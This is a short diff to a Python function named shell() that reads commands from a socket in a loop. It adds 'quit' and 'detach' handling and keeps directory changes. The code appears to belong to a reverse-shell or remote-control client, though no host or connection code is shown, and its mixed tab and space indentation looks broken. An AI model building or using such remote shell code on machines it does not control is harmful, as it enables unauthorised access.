@@ -19,8 +19,13 @@ def receive():
 def shell():
     while True:
         command = receive()
-        if command == 'q':
-            break
+	if command == "":
+	    continue
+        if command == 'detach':
+            continue
+	elif command == "quit":
+	    sock.close()
+	    break
         elif command[:2] == 'cd' and len(command) > 1:
             try:
                 os.chdir(command[3:])
